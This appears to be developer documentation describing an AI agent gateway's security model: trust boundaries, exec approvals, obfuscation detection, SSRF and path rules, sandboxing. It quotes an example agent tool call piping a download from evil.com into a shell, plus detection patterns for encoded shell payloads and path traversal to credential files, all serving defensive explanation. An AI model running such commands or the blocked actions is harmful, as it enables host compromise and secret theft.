# 10 — Security Model

**Source files**: `SECURITY.md`, `src/infra/exec-approvals*.ts`, `src/gateway/auth*.ts`, `src/gateway/method-scopes.ts`, `src/plugin-sdk/ssrf-policy.ts`, `src/security/`

---

## 1. Core Security Philosophy

OpenClaw's security model is built on one foundational principle:

> **Personal assistant (one trusted operator), not shared multi-tenant bus.**

This means:
- Security boundaries protect against **external attackers**, not between co-users of the same gateway
- **Authenticated gateway callers are treated as trusted operators** — session identifiers are routing controls, not per-user authorization boundaries
- If multiple people need OpenClaw, they each get their own gateway on their own host

The motto: "Strong defaults without killing capability."

---

## 2. Trust Boundaries

### 2.1 The Operator

The operator is the person who:
- Installed OpenClaw on the host
- Can modify `~/.openclaw/openclaw.json`
- Controls what plugins, tools, and channels are enabled
- Is authenticated to the gateway

An operator is fully trusted. If someone can modify `~/.openclaw/`, they are effectively an operator.

### 2.2 The Agent / Model

The LLM model/agent is **NOT** a trusted principal:

> "Assume prompt/content injection can manipulate behavior."

Security boundaries come from:
- Host/config trust
- Auth
- Tool policy
- Sandboxing
- Exec approvals

Prompt injection alone is not a security vulnerability unless it crosses one of these boundaries.

### 2.3 Gateway vs. Node

| Component | Role | Trust Level |
|-----------|------|-------------|
| Gateway | Control plane | Trusted — hosts operator config |
| Node | Remote execution extension | Operator-level if paired |
| Authenticated caller | Any client with valid token | Treated as trusted operator |

Pairing a remote node with the gateway grants that node operator-level exec capability. This is intentional and documented.

### 2.4 Plugins

Plugins are part of the **trusted computing base**:

> "Installing or enabling a plugin grants it the same trust level as local code running on that gateway host."

This means: security reports about plugins doing "bad things" are only valid if they demonstrate a **boundary bypass** (unauthenticated load, allowlist bypass, sandbox bypass) — not just that a trusted-installed plugin can execute with host privileges.

---

## 3. Exec Approval Flow

One of the most important security boundaries is the exec approval system. See also `08-infra.md`.

```
Agent generates tool call: bash { command: "curl http://evil.com | sh" }
    │
    ▼
src/gateway/node-invoke-system-run-approval.ts
    │  evaluateSystemRunApproval()
    │
    ▼
src/infra/exec-approvals.ts — evaluateExecApproval()
    │
    ├─ Is command on safe-bin list? → AUTO-APPROVE
    ├─ Is command on operator allowlist? → AUTO-APPROVE
    ├─ Is exec.profile = "allow-all"? → AUTO-APPROVE (dangerous)
    ├─ Is obfuscation detected? → FORCE APPROVAL REQUIRED
    │
    └─ DEFAULT → APPROVAL REQUIRED
         │
         ▼
    ExecApprovalManager (gateway)
         │  Blocks agent until human decides
         ▼
    Human approves → command runs on host
    Human denies → agent receives rejection error
```

### 3.1 Obfuscation Detection

`src/infra/exec-obfuscation-detect.ts` checks for:
- Base64-encoded shell payloads (`base64 -d | sh`)
- Hex-encoded payloads
- Variable substitution tricks
- Process substitution abuse (`<(some-command)`)

Detected obfuscation overrides the allowlist — even an allowlisted command pattern is rejected if it contains obfuscation.

### 3.2 Safe-Bin Trust Verification

`src/infra/exec-safe-bin-trust.ts` — when a command is "safe", the binary path is resolved and checked against a trust policy:
- Trusted paths: `/usr/bin/git`, `/usr/local/bin/node`, etc.
- Symlink safety: resolved paths must point to trusted binaries
- Content verification: optional hash checking for critical binaries

---

## 4. Gateway Authentication

`src/gateway/auth.ts` — the gateway authenticates every HTTP request and WebSocket connection.

### 4.1 Auth Modes

| Mode | Description |
|------|-------------|
| Default token | Bearer token set via `gateway.token` config |
| Device auth | Per-device tokens from paired companion apps |
| Trusted proxy | For reverse-proxy deployments (X-Forwarded headers) |
| Control UI session | Short-lived session for the web dashboard |

### 4.2 Auth Rate Limiting

`src/gateway/auth-rate-limit.ts` — failed authentication attempts are tracked per IP with a fixed-window rate limiter. Too many failures result in a temporary block.

Configuration:
- `gateway.auth.rateLimit.maxAttempts` — max failures before blocking
- `gateway.auth.rateLimit.windowMs` — time window

### 4.3 Method Scopes

`src/gateway/method-scopes.ts` — gateway API methods have access levels:
- `read` — read-only operations
- `write` — state-modifying operations
- `admin` — admin operations (config write, plugin install, etc.)

Clients with device auth may have restricted scopes compared to full operator auth.

---

## 5. SSRF Policy

`src/plugin-sdk/ssrf-policy.ts` — Server-Side Request Forgery protection for outbound HTTP calls made by plugins.

Blocked by default:
- Loopback addresses (`127.0.0.1`, `::1`, `localhost`)
- Link-local addresses (`169.254.x.x`, `fe80::`)
- Private network ranges (`10.x`, `172.16-31.x`, `192.168.x`)
- Cloud metadata endpoints (`169.254.169.254`, etc.)

Plugins making outbound HTTP requests should use the SDK's fetch helper which applies SSRF policy automatically:
```typescript
import { safeFetch } from "openclaw/plugin-sdk";
// Throws if the URL is an internal/private address
await safeFetch("https://api.example.com/data");
```

---

## 6. Path Safety and Boundary Enforcement

`src/infra/boundary-path.ts` — file system path boundary enforcement:

- Prevents path traversal (`../../../etc/passwd`)
- Enforces workspace-only restrictions when configured
- Validates that tool `read`/`write`/`edit` calls stay within allowed boundaries
- Blocks access to sensitive system paths (`~/.ssh/`, `/etc/passwd`, etc.)

When `tools.fs.workspaceOnly: true`:
- `read_file`, `write_file`, `edit_file`, `apply_patch` are restricted to the workspace directory
- Paths outside workspace are rejected with a boundary error

---

## 7. Sandbox System

The sandbox system provides OS-level isolation for agent exec operations.

`src/agents/sandbox/` — sandbox configuration and management:
- Uses Docker or bubblewrap for process isolation
- Mounts workspace directory read/write, rest read-only
- Network isolation (configurable)
- Resource limits (CPU, memory)

Sandbox modes (from `agents.defaults.sandbox.mode`):
- `off` — no sandbox (default; exec runs on gateway host)
- `non-main` — sandbox everything except the main agent session
- `all` — sandbox all sessions including main

> Default is `off` — this is intentional for the single-user trusted-operator model. Enable sandbox for untrusted content scenarios.

---

## 8. Sub-Agent Delegation Hardening

Spawned sub-agents can inherit or be further restricted relative to the parent:

- `sessions_spawn` with `sandbox: "require"` — rejects the spawn unless the child will be sandboxed
- `agents.list[].subagents.allowAgents` — allowlist of which agents can be spawned as sub-agents
- Sub-agent depth limits — prevent runaway agent trees

---

## 9. Web Interface Safety

The gateway's web interface (Control UI) is intended for **local use only**:

- Default bind: `loopback` (`127.0.0.1` / `::1`)
- Non-loopback deployments are surfaced by `openclaw security audit` as dangerous findings
- For remote access: use SSH tunnel or Tailscale (keeps gateway loopback-bound)
- Never expose the gateway directly to the public internet

CSP headers:
- `control-ui-csp.ts` — strict Content Security Policy applied to Control UI responses

Origin validation:
- `origin-check.ts` — validates the `Origin` header on WebSocket upgrade requests
- `startup-control-ui-origins.ts` — derives the allowed origin set from config at startup

---

## 10. Workspace Memory Trust Boundary

`MEMORY.md` and `memory/*.md` are treated as **trusted operator state**:

- If an attacker can write to workspace memory files, they have already crossed the trusted operator boundary
- Memory indexing/recall over those files is expected behavior
- This is out of scope for security reports unless an untrusted path to write those files is demonstrated

---

## 11. Temp Folder Boundary

`src/infra/tmp-openclaw-dir.ts` — OpenClaw uses a dedicated temp root:
- Preferred: `/tmp/openclaw`
- Fallback: `os.tmpdir()/openclaw` or `openclaw-<uid>` on multi-user hosts

Sandbox media validation allows absolute temp paths only under this managed root. Arbitrary host `/tmp` paths are not trusted media roots.

---

## 12. Security Audit Command

```bash
openclaw security audit
openclaw security audit --deep
openclaw security audit --fix
```

Runs a security posture check on the local gateway configuration. Flags:
- Non-loopback gateway binding
- Missing auth token
- Overly permissive exec policy
- Dangerous config combinations

---

## 13. Out-of-Scope (Summary)

These are commonly reported but NOT security vulnerabilities in OpenClaw's model:

| Category | Reason |
|----------|--------|
| Prompt injection only | No boundary bypass |
| Trusted-installed plugin with host access | Expected trust model behavior |
| Shared gateway multi-tenant isolation | Not a supported multi-tenant system |
| `sessions.list` cross-session reads | Routing controls, not auth boundaries |
| Post-approval executable drift (same path file swap) | Requires showing untrusted write path |
| Operator-enabled `dangerous*` options weakening defaults | Explicit break-glass tradeoffs |
| `system.run` on a host without sandbox | Default trusted-operator model behavior |

---

## 14. Key Files Summary

| File | Role |
|------|------|
| `SECURITY.md` | Full security policy and trust model |
| `src/infra/exec-approvals.ts` | Exec approval evaluation |
| `src/infra/exec-approvals-allowlist.ts` | Allowlist matching |
| `src/infra/exec-obfuscation-detect.ts` | Obfuscation detection |
| `src/infra/exec-safe-bin-policy.ts` | Safe-bin policy |
| `src/infra/boundary-path.ts` | Path boundary enforcement |
| `src/gateway/auth.ts` | Gateway authentication |
| `src/gateway/auth-rate-limit.ts` | Auth rate limiting |
| `src/gateway/method-scopes.ts` | API method access control |
| `src/gateway/origin-check.ts` | WebSocket origin validation |
| `src/gateway/security-path.ts` | Security path checks |
| `src/plugin-sdk/ssrf-policy.ts` | SSRF protection for outbound fetch |
| `src/agents/sandbox/` | Sandbox system |
| `src/infra/tmp-openclaw-dir.ts` | Managed temp directory |
| `src/cli/security-cli.ts` | `openclaw security audit` CLI |
